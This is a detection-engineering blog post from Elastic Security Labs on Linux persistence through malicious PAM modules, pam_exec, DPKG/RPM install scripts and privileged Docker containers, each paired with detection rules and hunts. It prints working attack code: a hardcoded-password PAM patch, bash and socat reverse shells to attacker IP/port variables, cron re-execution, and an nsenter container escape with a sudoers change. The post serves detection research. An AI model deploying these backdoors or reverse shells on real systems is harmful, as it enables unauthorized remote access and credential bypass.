---
title: "Linux Detection Engineering - Approaching the Summit on Persistence Mechanisms"
slug: "approaching-the-summit-on-persistence"
date: "2025-02-11"
description: "Building on foundational concepts and techniques explored in the previous publications, this post discusses some creative and/or complex persistence mechanisms."
author:
  - slug: ruben-groenewoud
image: "Security Labs Images 32.jpg"
category:
  - slug: security-research
---

# Introduction

Welcome to part four of the Linux Persistence Detection Engineering series! In this article, we continue to dig deep into the world of Linux persistence. Building on foundational concepts and techniques explored in the previous publications, this post discusses some creative and/or complex persistence mechanisms.

If you missed the earlier articles, they lay the groundwork by exploring key persistence concepts. You can catch up on them here:

* [*Linux Detection Engineering - A Primer on Persistence Mechanisms*](https://www.elastic.co/security-labs/primer-on-persistence-mechanisms)  
* [*Linux Detection Engineering - A Sequel on Persistence Mechanisms*](https://www.elastic.co/security-labs/sequel-on-persistence-mechanisms)  
* [*Linux Detection Engineering - A Continuation on Persistence Mechanisms*](https://www.elastic.co/security-labs/continuation-on-persistence-mechanisms)

In this publication, we’ll provide insights into:

* How each works (theory)  
* How to set each up (practice)  
* How to detect them (SIEM and Endpoint rules)  
* How to hunt for them (ES|QL and OSQuery reference hunts)

To make the process even more engaging, we will be leveraging [PANIX](https://github.com/Aegrah/PANIX), a custom-built Linux persistence tool designed by Ruben Groenewoud of Elastic Security. PANIX allows you to streamline and experiment with Linux persistence setups, making it easy to identify and test detection opportunities.

By the end of this series, you'll have a robust knowledge of common and rare Linux persistence techniques; and you'll understand how to effectively engineer detections for common and advanced adversary capabilities. Let’s dive in\!

# Setup note

To ensure you are prepared to detect the persistence mechanisms discussed in this article, it is important to [enable and update our pre-built detection rules](https://www.elastic.co/guide/en/security/current/prebuilt-rules-management.html#update-prebuilt-rules). If you are working with a custom-built ruleset and do not use all of our pre-built rules, this is a great opportunity to test them and potentially fill any gaps. Now, we are ready to get started.

# T1556.003 - Modify Authentication Process: Pluggable Authentication Modules

[Pluggable Authentication Modules (PAM)](https://www.redhat.com/en/blog/pluggable-authentication-modules-pam) are a powerful framework used in Linux to manage authentication-related tasks. PAM operates as a layer between applications and authentication methods, allowing system administrators to configure flexible and modular authentication policies. These modules are defined in configuration files typically found in `/etc/pam.d/`.

PAM modules themselves are shared library files commonly stored in the following locations:

* `/lib/security/`  
* `/lib64/security/`  
* `/lib/x86_64-linux-gnu/security/`  
* `/usr/lib/security/`  
* `/usr/lib64/security/`  
* `/usr/lib/x86_64-linux-gnu/security/`

These locations house modules that perform authentication tasks, such as validating passwords, managing accounts, or executing scripts during authentication. While PAM provides the essential capability to centralize how secure authentication happens, its flexibility can be abused by attackers to establish persistence through malicious PAM modules. By introducing custom modules or modifying existing configurations, attackers can manipulate authentication flows to capture credentials, manipulate logging to evade detection, grant unauthorized access, or execute malicious code.

This is a common technique, and some examples include the open-source [Medusa](https://github.com/ldpreload/Medusa) and [Azazel](https://github.com/chokepoint/azazel) rootkits, and by malwares such as [Ebury](https://attack.mitre.org/software/S0377/), and [Skidmap](https://unit42.paloaltonetworks.com/linux-pam-apis/) to establish persistence, capture credentials, and maintain unauthorized access. MITRE ATT\&CK tracks this technique under the identifier [T1556.003](https://attack.mitre.org/techniques/T1556/003/).

## T1556.003 - Pluggable Authentication Modules: Malicious PAM

Malicious PAM modules are custom-built, malicious shared libraries designed to be loaded during the PAM authentication process. Although there are many different ways to establish a PAM backdoor, in this section we will showcase how PAM can be patched to allow for backdoor SSH access.

Commonly, PAM backdoors will patch the `pam_unix_auth.c` file, which is part of the `pam_unix` module, a widely used PAM module for UNIX-style password authentication. An open-source example of this is the [linux-pam-backdoor](https://github.com/zephrax/linux-pam-backdoor) by [zephrax](https://github.com/zephrax). The typical code that is run to verify the password of a user requesting authentication, looks as follows:

```c
/* verify the password of this user */
retval = _unix_verify_password(pamh, name, p, ctrl);
name = p = NULL;
```

The original code calls the `_unix_verify_password` function to validate the provided password (`p`) against the stored password for the user (`name`). The full source code is available [here](https://github.com/linux-pam/linux-pam/blob/fc927d8f1a6d81e5bcf58096871684b35b793fe2/modules/pam_unix/pam_unix_auth.c).

A threat actor may patch this code, and introduce an additional check.

```c
/* verify the password of this user */
if (strcmp(p, "_PASSWORD_") != 0) {    
	retval = _unix_verify_password(pamh, name, p, ctrl); 
} else {    
	retval = PAM_SUCCESS; 
}
```

The code now checks:

* If the provided password (`p`) is not equal to the string literal `"_PASSWORD_"`, it proceeds to call `_unix_verify_password` for standard password validation.  
* If the password is `"_PASSWORD_"`, it skips the password verification entirely and directly returns `PAM_SUCCESS`, indicating successful authentication.

The patch introduces a hardcoded backdoor password. Any user who enters the password `"_PASSWORD_"` will bypass normal password verification and be authenticated successfully, regardless of the actual password stored for the account.

### Persistence through T1556.003 - Pluggable Authentication Modules: Malicious PAM

We will be leveraging the [setup_pam.sh](https://github.com/Aegrah/PANIX/blob/main/modules/setup_pam.sh) module from PANIX to test this technique and research potential detection opportunities. This patch is easily implemented by downloading the PAM source code for the correct PAM version from the [linux-pam](https://github.com/linux-pam/linux-pam/releases) GitHub repository, looking for the line to replace, and replacing it with your own hardcoded password:

```bash
echo "[+] Modifying PAM source..."
local target_file="$src_dir/modules/pam_unix/pam_unix_auth.c"
if grep -q "retval = _unix_verify_password(pamh, name, p, ctrl);" "$target_file"; then
	sed -i '/retval = _unix_verify_password(pamh, name, p, ctrl);/a\
	if (p != NULL && strcmp(p, "'$password'") != 0) { retval = _unix_verify_password(pamh, name, p, ctrl); } else { retval = PAM_SUCCESS; }' "$target_file"
	echo "[+] Source modified successfully."
else
	echo "[-] Target string not found in $target_file. Modification failed."
	exit 1
fi
```

After which we can compile the shared object, and move it to the correct PAM directory.

Now let’s run the [setup_pam.sh](https://github.com/Aegrah/PANIX/blob/main/modules/setup_pam.sh) module. This technique requires several compilation tools and downloading a specific Linux-PAM release. Execute the following PANIX command to inject a malicious module.

```
> sudo ./panix.sh --pam --module --password persistence

[+] Determining PAM version...                                                                                          
[+] Detected PAM Version: '1.3.1'
[+] Downloading PAM source...
[+] Download completed. Extracting...
[+] Extraction completed.
[+] Modifying PAM source... 
[+] Source modified successfully.
[+] Compiling PAM source...
[+] PAM compiled successfully.
[+] Detecting PAM library directory...
[+] Backing up original PAM library...
[+] Copying PAM library to /lib/x86_64-linux-gnu/security...
[+] Checking SELinux status...
[+] Rogue PAM injected!                                                                                                                                                                                                             
You can now login to any user (including root) with a login shell using your specified password.
Example: su - user
Example: ssh user@ip

[+] PAM persistence established! 
```

Let’s analyze the events of interest in Discover. Due to the huge load of events originating from compiling PAM source, these events are sorted from oldest (top) to newest (bottom).

![PANIX Malicious PAM module execution visualized in Kibana - part 1](/assets/images/approaching-the-summit-on-persistence/image4.png)

Upon execution of PANIX, we can see `dpkg` being used to discover the running PAM version, followed by a `curl` execution to download the linux-pam source for this identified version. After extracting the `tar` archive, PANIX continues to modify the `pam_unix_auth.c` source code to implement the backdoor.

Once the above steps are completed, the following events occur (sorted from newest (top) to oldest (bottom)):

![PANIX Malicious PAM module execution visualized in Kibana - part 2](/assets/images/approaching-the-summit-on-persistence/image1.png)

The `pam_unix.so` file is compiled, and moved to the correct directory (in this case `/lib/x86_64-linux-gnu/security`), overwriting the existing `pam_unix.so` file and successfully activating the backdoor.

Let's review the coverage:

*Detection and endpoint rules that cover Malicious PAM persistence*

| Category | Coverage |
| :---- | :---- |
| File | [Creation or Modification of Pluggable Authentication Module or Configuration](https://github.com/elastic/detection-rules/blob/ac541f0b18697e053b3b56544052955d29b440c0/rules/linux/persistence_pluggable_authentication_module_creation.toml) <br /> [Pluggable Authentication Module Creation in Unusual Directory](https://github.com/elastic/detection-rules/blob/ac541f0b18697e053b3b56544052955d29b440c0/rules/linux/persistence_pluggable_authentication_module_creation_in_unusual_dir.toml) <br /> [Potential Persistence via File Modification](https://github.com/elastic/detection-rules/blob/ac541f0b18697e053b3b56544052955d29b440c0/rules/integrations/fim/persistence_suspicious_file_modifications.toml) |
| Process | [Pluggable Authentication Module Version Discovery](https://github.com/elastic/detection-rules/blob/ac541f0b18697e053b3b56544052955d29b440c0/rules/linux/discovery_pam_version_discovery.toml) <br /> [Pluggable Authentication Module Source Download](https://github.com/elastic/detection-rules/blob/ac541f0b18697e053b3b56544052955d29b440c0/rules/linux/persistence_pluggable_authentication_module_source_download.toml) |
| Authentication | [Authentication via Unusual PAM Grantor](https://github.com/elastic/detection-rules/blob/ac541f0b18697e053b3b56544052955d29b440c0/rules/linux/persistence_unusual_pam_grantor.toml) |

To revert any changes made to the system by PANIX, you can use the corresponding revert module by running:

```
> ./panix.sh --revert pam

[+] Searching for rogue PAM module
[+] Restored original PAM module '/lib/x86_64-linux-gnu/security/pam_unix.so'.
[+] Restarting SSH service...
[+] SSH service restarted successfully.
```

### Hunting for T1556.003 - Pluggable Authentication Modules (Malicious PAM)

Other than relying on detections, it is important to incorporate threat hunting into your workflow, especially for persistence mechanisms like these, where events can potentially be missed due to timing. This publication will solely list the available hunts for each persistence mechanism; however, more details regarding the basics of threat hunting are outlined in the “*Hunting for T1053 \- scheduled task/job*” section of “[*Linux Detection Engineering \-  A primer on persistence mechanisms*](https://www.elastic.co/security-labs/primer-on-persistence-mechanisms)”. Additionally, descriptions and references can be found in our [Detection Rules repository](https://github.com/elastic/detection-rules), specifically in the [Linux hunting subdirectory](https://github.com/elastic/detection-rules/tree/main/hunting).

We can hunt for PAM persistence through [ES|QL](https://www.elastic.co/guide/en/elasticsearch/reference/current/esql.html) and [OSQuery](https://www.elastic.co/guide/en/kibana/current/osquery.html), focusing on file creations (as this technique requires the compilation of modified PAM components) and modifications to PAM-related files and directories. The approach includes monitoring for the following:

* **Creations and/or modifications to PAM configuration files:** Tracks changes to files in the `/etc/pam.d/` and `/lib/security/` directories and the `/etc/pam.conf` file, which are commonly targeted for PAM persistence.

By combining the [Persistence via Pluggable Authentication Modules](https://github.com/elastic/detection-rules/blob/ac541f0b18697e053b3b56544052955d29b440c0/hunting/linux/docs/persistence_via_pluggable_authentication_module.md) hunting rule with the tailored detection queries listed above, analysts can effectively identify and respond to [T1556.003](https://attack.mitre.org/techniques/T1556/003/).

## T1556.003 - Pluggable Authentication Modules: pam_exec.so

The `pam_exec.so` module, part of the PAM framework, allows administrators to execute external commands or scripts during the authentication process. This flexibility is powerful for extending authentication workflows with tasks like logging, additional security checks, or notifications. However, this same capability can be exploited by attackers to log passwords or execute backdoors, enabling malicious scripts to run when users authenticate.

To understand how `pam_exec.so` can be configured, consider the following excerpt from `/etc/pam.d/common-auth`, a file that defines the authentication scheme for Linux systems:

```py
# /etc/pam.d/common-auth - authentication settings common to all services

# Primary modules
auth [success=1 default=ignore] pam_unix.so nullok_secure

# Fallback if no module succeeds
auth requisite pam_deny.so

# Ensure a positive return value if none is set
auth required pam_permit.so
```

This file controls how authentication is processed for all services. Each line defines a module and its behavior. For instance:

* The `auth` keyword indicates that the module operates during the authentication phase.  
* Control flags, like `[success=1 default=ignore]`, specify how PAM interprets the module's result. For example, `success=1` skips the next module if the current one succeeds.  
* The `requisite` flag immediately denies authentication if the module fails:  
  * `auth requisite pam_deny.so`  
* The `required` flag ensures the module must succeed for authentication to proceed, though subsequent modules in the stack will still execute:  
  * `auth required pam_permit.so`

Modules such as `pam_unix.so` handle traditional UNIX authentication by validating user credentials against `/etc/shadow`. Together, these components define the authentication process and dictate how the system responds to various conditions. For more information and examples, visit the [pam.d man page](https://linux.die.net/man/5/pam.d).

One way of abusing this mechanism is by leveraging the `pam_exec.so` module to execute an arbitrary script upon authentication through `/etc/pam.d/sshd`. By providing the path to a backdoor script on the host system, we can ensure that our backdoor is executed on every successful SSH authentication. [Group-IB](https://www.group-ib.com/) wrote about this technique in a recent publication dubbed “[*The Duality of the Pluggable Authentication Module (PAM)*](https://www.group-ib.com/blog/pluggable-authentication-module/)”.

A second method involves the modification of `/etc/pam.d/common-auth` for Debian-based systems or `/etc/pam.d/sshd` for Fedora-based systems to log user credentials. This technique was earlier discussed in [Wunderwuzzi’s blog](https://embracethered.com/blog/) called “[*Post Exploitation: Sniffing Logon Passwords with PAM*](https://embracethered.com/blog/posts/2022/post-exploit-pam-ssh-password-grabbing/)”. While capturing credentials isn't technically a persistence mechanism, it enables ongoing access to a host by leveraging stolen credentials.

In the next section we will take a look at how to implement arbitrary command execution through `pam_exec.so` using PANIX.

### Persistence through T1556.003 - Pluggable Authentication Modules: pam_exec.so

To better understand the technique, we will take a look at the [setup_pam.sh](https://github.com/Aegrah/PANIX/blob/main/modules/setup_pam.sh) PANIX module. 

```
echo -e "#!/bin/bash\nnohup setsid /bin/bash -c '/bin/bash -i >& /dev/tcp/$ip/$port 0>&1' &" > /bin/pam_exec_backdoor.sh

chmod 700 /bin/pam_exec_backdoor.sh

pam_sshd_file="/etc/pam.d/sshd"
pam_line="session optional pam_exec.so seteuid /bin/pam_exec_backdoor.sh"
```

The first step is to create the backdoor script to execute, this can be any C2 beacon, reverse shell or other means of persistence. PANIX creates a simple reverse shell and grants it execution permissions. Once the backdoor in `/bin/pam_exec_backdoor.sh` is in place, the `/etc/pam.d/sshd` file is modified. The `session` keyword ensures the script runs during user session setup or teardown, while `seteuid` ensures the script runs with the effective user ID (`eUID`) of the authenticated user instead of root.

Since the detection methods for the password harvesting module are quite similar to those of the backdoor module, we will focus on discussing the backdoor module in detail. You are encouraged to explore the [password-harvesting module](https://github.com/Aegrah/PANIX/blob/7a9cf39b35b40ee64bfe6b510f685003ebc043ae/modules/setup_pam.sh#L257) on your own\!

Let’s run the PANIX module with the following command line arguments:

```
> sudo ./panix.sh --pam --pam-exec --backdoor --ip 192.168.100.1 --port 2015

[+] Creating reverse shell script at /bin/pam_exec_backdoor.sh...
[+] /bin/pam_exec_backdoor.sh created and permissions set to 700.
[+] Modifying /etc/pam.d/sshd to include the PAM_EXEC rule...
[+] PAM_EXEC rule added to /etc/pam.d/sshd.
[+] Restarting SSH service to apply changes...
[+] SSH service restarted successfully.
[+] PAM_EXEC reverse shell backdoor planted!

Authenticate to trigger the reverse shell.

[+] PAM persistence established!
```

After triggering the reverse shell by authentication, we can analyze the logs in Discover:

![PANIX pam_exec.so module execution visualized in Kibana](/assets/images/approaching-the-summit-on-persistence/image3.png)

After PANIX executes, it creates and grants execution permissions to the `/bin/pam_exec_backdoor.sh` backdoor. Next, the backdoor configuration is added to the `/etc/pam.d/sshd` file, and the `SSHD` service is restarted. Upon authentication, we can see the execution of the backdoor by the `SSHD` parent process, starting the reverse shell chain (`pam_exec_backdoor.sh` → `nohup` → `setsid` → `bash`). 

Let’s review the coverage. The key distinction between this technique and the previous one is that this method relies on configuration changes rather than compiling a new PAM module, requiring a different set of detection rules to address the threat effectively:

*Detection and endpoint rules that cover pam_exec.so persistence*

| Category | Coverage |
| :---- | :---- |
| File | [Creation or Modification of Pluggable Authentication Module or Configuration](https://github.com/elastic/detection-rules/blob/ac541f0b18697e053b3b56544052955d29b440c0/rules/linux/persistence_pluggable_authentication_module_creation.toml) <br /> [Potential Persistence via File Modification](https://github.com/elastic/detection-rules/blob/ac541f0b18697e053b3b56544052955d29b440c0/rules/integrations/fim/persistence_suspicious_file_modifications.toml) |
| Process | [Potential Backdoor Execution Through PAM_EXEC](https://github.com/elastic/protections-artifacts/blob/8a9e857453566068088f5a24cc1f39b839e60fe8/behavior/rules/linux/persistence_potential_backdoor_execution_through_pam_exec.toml) <br /> [Unusual SSHD Child Process](https://github.com/elastic/detection-rules/blob/e528feb989d8fc7f7ca8c4100c0bf5ca7b912a5d/rules/linux/persistence_unusual_sshd_child_process.toml) |

To revert any changes, you can use the corresponding revert module by running:

```
> ./panix.sh --revert pam

[+] Removing PAM_EXEC backdoor...
[+] Removed '/bin/pam_exec_backdoor.sh'.
[+] Removed PAM_EXEC line from '/etc/pam.d/sshd'.
[+] Restarting SSH service...
[+] SSH service restarted successfully.
[-] PAM_EXEC line not found in '/etc/pam.d/common-auth'.
```

### Hunting for T1556.003 - Pluggable Authentication Modules: pam_exec.so

We can hunt for this technique using ES|QL and OSQuery by focusing on suspicious activity tied to its use. This technique relies on altering PAM configuration files, rather than compilation to execute commands or scripts. The approach includes monitoring for the following:

* **Child processes spawned from SSH:** Tracks processes initiated via SSH sessions, as these may indicate the misuse of `pam_exec.so` for persistence.  
* **Creations and/or modifications to PAM configuration files:** Tracks changes to files in the `/etc/pam.d/` and `/lib/security/` directories and the `/etc/pam.conf` file, which are commonly targeted for PAM persistence.

By combining the [Persistence via Pluggable Authentication Modules](https://github.com/elastic/detection-rules/blob/ac541f0b18697e053b3b56544052955d29b440c0/hunting/linux/docs/persistence_via_pluggable_authentication_module.md) hunting rule with the tailored detection queries listed above, analysts can effectively identify and respond to [T1556.003](https://attack.mitre.org/techniques/T1556/003/).

# T1546.016 - Event Triggered Execution: Installer Packages

Package managers are used to install, update, and manage software packages. While these tools streamline software management, they can also be abused by attackers to gain initial access or achieve persistence. By hijacking the package manager's execution flow, attackers can insert malicious code that executes during routine package management tasks, such as package installation or updates. This technique is tracked by MITRE under the identifier [T1546.016](https://attack.mitre.org/techniques/T1546/016/).

## T1546.016 - Installer Packages: DPKG & RPM

Popular managers include `DPKG` (Debian Package) for Debian-based distributions and `RPM` (Red Hat Package Manager) for Red Hat-based systems.

**1. DPKG (Debian Package Manager)**

`DPKG`, the Debian package manager, processes `.deb` packages and supports lifecycle scripts such as `preinst`, `postinst`, `prerm`, and `postrm`. These scripts run at different stages of the package lifecycle, making them a potential target for executing malicious commands. A potential DPKG package file structure used for malicious intent could look like this:

```
malicious_package/
├── DEBIAN/
├── control
├── postinst
```

Where the post-installation script (`postinst`) runs immediately after a package is installed, allowing the attacker to gain initial access or establish persistence through malicious code.

Upon installation, the `DPKG` scripts (`preinst`, `postinst`, `prerm`, and `postrm`) will be stored in the `/var/lib/dpkg/info/` directory and executed. Package installation logs are stored in `/var/log/dpkg.log`, and record commands like `dpkg -i` and the package names.

**2. RPM (Red Hat Package Manager)**

`RPM`, the Red Hat Package Manager, is the default package manager for Red Hat-based distributions like Fedora, CentOS, and RHEL. It processes `.rpm` packages and supports script sections such as `%pre`, `%post`, `%preun`, and `%postun`, which execute at various stages of the package lifecycle. These scripts can be exploited by attackers to run arbitrary commands during installation, removal, or updates.

A typical malicious RPM package might include a `%post` script embedded directly in the package’s `spec` file. For example, a `%post` script could launch a reverse shell or modify critical system configurations immediately after the package installation completes. An example package layout could look as follows:

```
~/rpmbuild/
├── SPECS/
│    ├── malicious_package.spec
├── BUILD/
├── RPMS/
├── SOURCES/
├── SRPMS/
```

Upon installation, `RPM` runs the `%post` script, allowing the attacker to execute the payload. The package manager logs installation activity in `/var/log/rpm.log`, which includes the names and timestamps of installed packages. Additionally, the built `RPM` package is stored in `/var/lib/rpm/`.

### Persistence through T1546.016 - Installer Packages: DPKG & RPM

PANIX can establish persistence through both `DPKG` and `RPM` within the [setup_malicious_package.sh](https://github.com/Aegrah/PANIX/blob/ae404d5caf74c772436ccaaa0c3ab51cba8c4250/modules/setup_malicious_package.sh) module. Starting with `DPKG`, the directory structure is created, the control file is written and the payload is added to the `postinst` file:

```
# DPKG package setup
PACKAGE_NAME="panix"
PACKAGE_VERSION="1.0"
DEB_DIR="${PACKAGE_NAME}/DEBIAN"
PAYLOAD="#!/bin/sh\nnohup setsid bash -c 'bash -i >& /dev/tcp/${ip}/${port} 0>&1' &"

# Create directory structure
mkdir -p ${DEB_DIR}

# Write postinst script
echo -e "${PAYLOAD}" > ${DEB_DIR}/postinst
chmod +x ${DEB_DIR}/postinst

# Write control file
echo "Package: ${PACKAGE_NAME}" > ${DEB_DIR}/control
echo "Version: ${PACKAGE_VERSION}" >> ${DEB_DIR}/control
echo "Architecture: all" >> ${DEB_DIR}/control
echo "Maintainer: https://github.com/Aegrah/PANIX" >> ${DEB_DIR}/control
echo "Description: This malicious package was added through PANIX" >> ${DEB_DIR}/control
```

Afterwards, all that is left is to build the package with `dpkg-deb` and install it through `dpkg`. 

```
# Build the .deb package
dpkg-deb --build ${PACKAGE_NAME}

# Install the .deb package
dpkg -i ${PACKAGE_NAME}.deb
```

Upon installation, or updating of the package, the payload will be executed. In order to persist on a regular interval, any other persistence mechanism can be used. PANIX leverages `Cron`:

```
echo "*/1 * * * * /var/lib/dpkg/info/${PACKAGE_NAME}.postinst configure > /dev/null 2>&1" | crontab -
```


To forcefully install the package on a certain interval. This is of course not a stealthy mechanism, but serves as a proof of concept to emulate the technique. Let’s run the payload, and analyze the simulated events in Kibana:

```
sudo ./panix.sh --malicious-package --dpkg --ip 192.168.100.1 --port 2019
dpkg-deb: building package 'panix' in 'panix.deb'.
Preparing to unpack panix.deb ...
Unpacking panix (1.0) over (1.0) ...
Setting up panix (1.0) ...
nohup: appending output to 'nohup.out'
[+] Malicious package persistence established.
```

Looking at the events generated in Kibana, we can see the following sequence:

![PANIX malicious-package module execution visualized in Kibana (DPKG)](/assets/images/approaching-the-summit-on-persistence/image2.png) 

PANIX is executed via `sudo`, after which the `postinst` and `control` files are created. The package is then built using `dpkg-deb`, and installed with `dpkg -i`. Here we can see the `/var/lib/dpkg/info/panix.postinst` executing the reverse shell execution chain (`nohup` → `setsid` → `bash`). After installation, the `crontab` is altered to establish persistence on a one-minute interval.

**RPM**

For `RPM`, a similar flow as `DPKG` is leveraged. The package is set up using the correct `RPM` package structure, and the `%post` section is set to contain the payload that gets triggered after installation:

```
# RPM package setup
PACKAGE_NAME="panix"
PACKAGE_VERSION="1.0"
cat <<-EOF > ~/rpmbuild/SPECS/${PACKAGE_NAME}.spec
Name: ${PACKAGE_NAME}
Version: ${PACKAGE_VERSION}
Release: 1%{?dist}
Summary: RPM package with payload script
License: MIT

%description
RPM package with a payload script that executes a reverse shell.

%prep
# No need to perform any preparation actions

%install
# Create directories
mkdir -p %{buildroot}/usr/bin

%files
# No need to specify any files here since the payload is embedded

%post
# Trigger payload after installation
nohup setsid bash -c 'bash -i >& /dev/tcp/${ip}/${port} 0>&1' &

%clean
rm -rf %{buildroot}

%changelog
* $(date +'%a %b %d %Y') John Doe <john.doe@example.com> 1.0-1
- Initial package creation
```

Next, the `RPM` package is built using `rpmbuild`, and installed with `rpm`:

```
# Build RPM package
rpmbuild -bb ~/rpmbuild/SPECS/${PACKAGE_NAME}.spec

# Install RPM package with forced overwrite
VER=$(grep VERSION_ID /etc/os-release | cut -d '"' -f 2 | cut -d '.' -f 1)
rpm -i --force ~/rpmbuild/RPMS/x86_64/${PACKAGE_NAME}-1.0-1.el${VER}.x86_64.rpm
mv ~/rpmbuild/RPMS/x86_64/${PACKAGE_NAME}-1.0-1.el${VER}.x86_64.rpm /var/lib/rpm/${PACKAGE_NAME}.rpm
```

Upon installation, the payload will be executed. Again, the following `Cron` job is created to ensure persistence on a one-minute interval:

```
echo "*/1 * * * * rpm -i --force /var/lib/rpm/${PACKAGE_NAME}.rpm > /dev/null 2>&1" | crontab
```

Let’s examine the traces that the `RPM` package technique leaves behind:

![PANIX malicious-package module execution visualized in Kibana (RPM)](/assets/images/approaching-the-summit-on-persistence/image5.png)

Upon PANIX execution, the `panix.spec` file is created and populated. Next, `rpmbuild` is used to build the package, and `rpm -i` is executed to install the package. Upon installation, the `%post` payload is executed, leading to an execution of the reverse shell chain (`nohup` → `setsid` → `bash`) with a `process.parent.command_line` of `/bin/sh /var/tmp/rpm-tmp.HjtRV5 1`, indicating the execution of an `RPM` package. After installation, `Crontab` is altered to execute the payload once, at one minute intervals for consistency.   
Let’s take a look at the coverage:

*Detection and endpoint rules that cover installer package (DPKG & RPM) persistence*

| Category | Coverage |
| :---- | :---- |
| Process | [RPM Package Installed by Unusual Parent Process](https://github.com/elastic/detection-rules/blob/2ff2965cb96be49e316a2e928c74afd16e1b3554/rules/linux/persistence_rpm_package_installation_from_unusual_parent.toml) <br />[Unusual DPKG Execution](https://github.com/elastic/detection-rules/blob/2ff2965cb96be49e316a2e928c74afd16e1b3554/rules/linux/persistence_dpkg_unusual_execution.toml) <br /> [DPKG Package Installed by Unusual Parent Process](https://github.com/elastic/detection-rules/blob/2ff2965cb96be49e316a2e928c74afd16e1b3554/rules/linux/persistence_dpkg_package_installation_from_unusual_parent.toml) |
| Network | [Egress Network Connection from Default DPKG Directory](https://github.com/elastic/protections-artifacts/blob/065efe897b511e9df5116f9f96b6cbabb68bf1e4/behavior/rules/linux/persistence_egress_network_connection_from_default_dpkg_directory.toml) <br /> [Egress Network Connection from RPM Package](https://github.com/elastic/protections-artifacts/blob/065efe897b511e9df5116f9f96b6cbabb68bf1e4/behavior/rules/linux/persistence_egress_network_connection_from_rpm_package.toml) |

You can revert the changes made by PANIX by running the following revert command:

```
> ./panix.sh --revert malicious-package

[+] Reverting malicious package...
[+] Removing DPKG package 'panix'...
[+] DPKG package 'panix' removed successfully.
[+] Removing cron job associated with 'panix'...
[+] Cron job removed.
[+] Cleaning up '/var/lib/dpkg/info'...
[+] Cleanup completed.
```

### Hunting for T1546.016 - Installer Packages: DPKG & RPM

We can hunt for this technique using ES|QL and OSQuery by focusing on suspicious activity tied to package management tools. The approach includes monitoring for the following:

* **File creation or modification in package management directories:** Tracks unusual changes to files in paths like `/var/lib/dpkg/info/` and `/var/lib/rpm/`, excluding common benign patterns such as checksum or list files.  
* **Processes executed from lifecycle scripts:** Observes commands and processes launched from directories like `/var/tmp/rpm-tmp.*` and `/var/lib/dpkg/info/`, which may indicate suspicious or unauthorized activity.  
* **Detailed metadata on modified files:** Uses OSQuery to gather additional file metadata, including ownership and timestamps, for forensic analysis of package management activity.

By combining the [Persistence via DPKG/RPM Package](https://github.com/elastic/detection-rules/blob/ac541f0b18697e053b3b56544052955d29b440c0/hunting/linux/docs/persistence_via_rpm_dpkg_installer_packages.md) hunting rule with the tailored detection queries listed above, analysts can effectively identify and respond to [T1546.016](https://attack.mitre.org/techniques/T1546/016/).

# T1610 - Deploy Container

Host escape involves exploiting vulnerabilities, misconfigurations, or excessive permissions in containerized or virtualized environments to gain access to the underlying host system. Technologies like Docker, Kubernetes, and VMware aim to isolate workloads, but improper configurations or shared resources can allow attackers to break out of the container and compromise the host. MITRE tracks container deployment under identifier [T1610](https://attack.mitre.org/techniques/T1610/).

## T1610 - Deploy Container: Malicious Docker Container

Docker containers are particularly susceptible to host escapes when improperly secured. Attackers may exploit vulnerabilities or misconfigurations in two main ways:

**1. Manipulating a Running Container**

Attackers abuse misconfigured containers to execute commands affecting the host. Common scenarios include:

* **Privileged Mode**: Containers running with `--privileged` can directly interact with host resources. For example, attackers may load kernel modules or access host-level devices.  
* **Excessive Capabilities**: Containers with the `CAP_SYS_ADMIN` capability can perform privileged operations, such as mounting filesystems or accessing `/dev` devices.  
* **Sensitive Volume Access**: Volumes like `/var/run/docker.sock` allow attackers to issue Docker commands to the host.  
* **Host Namespace Access**: Containers configured with `--pid=host` or `--net=host` expose the host's process and network namespaces. Attackers can escalate privileges by targeting processes or manipulating network configurations directly.

**2. Deploying a Malicious Container**

Attackers deploy custom containers designed to break out of isolation. These containers often include:

* Exploits targeting runtime vulnerabilities or kernel bugs.  
* Scripts for privilege escalation or persistence, such as reverse shells or C2 beacons.  
* Malicious configurations enabling unauthorized access to host resources.

In the next section, we will take a look at an example of a malicious docker container implementation.

### Persistence through T1610 \- Deploy Container: Malicious Docker Container

In this scenario, we will take a look at how to simulate the creation of an exemplary malicious Docker container through PANIX. Within the [setup_malicious_docker_container.sh](https://github.com/Aegrah/PANIX/blob/ae404d5caf74c772436ccaaa0c3ab51cba8c4250/modules/setup_malicious_docker_container.sh) module, PANIX creates a Dockerfile with the following contents:

```
FROM alpine:latest

RUN apk add --no-cache bash socat sudo util-linux procps

RUN adduser -D lowprivuser

RUN echo '#!/bin/bash' > /usr/local/bin/entrypoint.sh \\
	&& echo 'while true; do /bin/bash -c "socat exec:\"/bin/bash\",pty,stderr,setsid,sigint,sane tcp:$ip:$port"; sleep 60; done' >> /usr/local/bin/entrypoint.sh \\
	&& chmod +x /usr/local/bin/entrypoint.sh

RUN echo '#!/bin/bash' > /usr/local/bin/escape.sh \\
	&& echo 'sudo nsenter -t 1 -m -u -i -n -p -- su -' >> /usr/local/bin/escape.sh \\
	&& chmod +x /usr/local/bin/escape.sh \\
	&& echo 'lowprivuser ALL=(ALL) NOPASSWD: /usr/bin/nsenter' >> /etc/sudoers

USER lowprivuser

ENTRYPOINT ["/usr/local/bin/entrypoint.sh"]
```

The Dockerfile sets up a lightweight Alpine Linux container with tools like `bash`, `socat`, and `nsenter`. The `entrypoint.sh` script ensures continuous reverse shell access by repeatedly connecting to a remote server using `socat`. The `escape.sh` script, which is granted passwordless `sudo` permissions, uses `nsenter` to attach to the host's namespaces (e.g., mount, network, PID) via the init process, effectively breaking container isolation.

The container is built using:

`docker build -t malicious-container -f $DOCKERFILE . && \`

Where the `-t` flag tags the container for easy identification, and `-f` specifies the Dockerfile path.

It is then run with:

`docker run -d --name malicious-container --privileged --pid=host malicious-container`

Where the `--privileged` flag allows full access to host resources, bypassing Docker’s isolation mechanisms, while `--pid=host` shares the host's process namespace, enabling the container to interact directly with host-level processes. 

To test this technique, Docker must be installed, and the user running the simulation must either have root or docker group permissions. Let’s run the payload and examine the logs through the execution of the following PANIX command:

```
sudo ./panix.sh --malicious-container --ip 192.168.100.1 --port 2021

 => [1/5] FROM [installing ...]
 => [2/5] RUN apk add --no-cache bash socat sudo util-linux procps
 => [3/5] RUN adduser -D lowprivuser
 => [4/5] RUN echo '#!/bin/bash' > /usr/local/bin/entrypoint.sh && echo 'while true; do /bin/bash -c "socat exec:
 => [5/5] RUN echo '#!/bin/bash' > /usr/local/bin/escape.sh && echo 'sudo nsenter -t 1 -m -u -i -n -p -- su -'

9543f7ce4c6a8defcad36358f00eb4d38a85a8688cc8ecd5f15a5a2d3f43383b

[+] Malicious Docker container created and running.
